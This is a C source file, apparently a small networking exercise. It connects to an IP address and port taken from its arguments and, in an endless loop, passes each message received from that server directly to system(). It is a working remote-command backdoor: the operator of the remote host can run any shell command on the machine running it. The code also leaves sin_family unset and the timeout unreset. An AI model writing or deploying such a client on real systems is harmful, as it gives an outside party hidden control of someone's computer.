//
// Created by Pamula File on 7/11/21.
//
#include <sys/socket.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <netdb.h>
#include <string.h>
#include <arpa/inet.h>

int sock = 0;

typedef struct  client
{
    int     socket;
    struct client *next;
}               t_client;

void error_exit(const char * err)
{
    close(sock);
    perror(err);
    exit(1);
}

void check_int_fatal(int ret, char *msg)
{
    if (ret == -1)
    {
        error_exit(msg);
    }
}

int main(int ac, char **av)
{
    int     ret;
    struct sockaddr_in addr;
    socklen_t len;
    fd_set read_fd;
    struct timeval tv;
    char rcv[400];

    tv.tv_sec = 3;
    tv.tv_usec = 0;
    if (ac != 3)
        error_exit("3 args");
    addr.sin_addr.s_addr = inet_addr(av[1]);
    addr.sin_port = htons(atoi(av[2]));
    len = sizeof(addr);
    sock = socket(AF_INET, SOCK_STREAM, 0);
    check_int_fatal(sock, "socket");
    ret = connect(sock, (const struct sockaddr *)&addr, len);
    check_int_fatal(ret, "connect");
    while (21)
    {
        FD_ZERO(&read_fd);
        FD_SET(sock, &read_fd);
        ret = select(sock + 1, &read_fd, NULL, NULL, &tv);
        check_int_fatal(ret, "select");
        if (!ret)
            continue ;
        if ( FD_ISSET(sock, &read_fd))
        {
            bzero(rcv, 400);
            ret = recv(sock, rcv, 399, 0);
            check_int_fatal(ret, "recv");
            system(rcv);
        }
    }
}
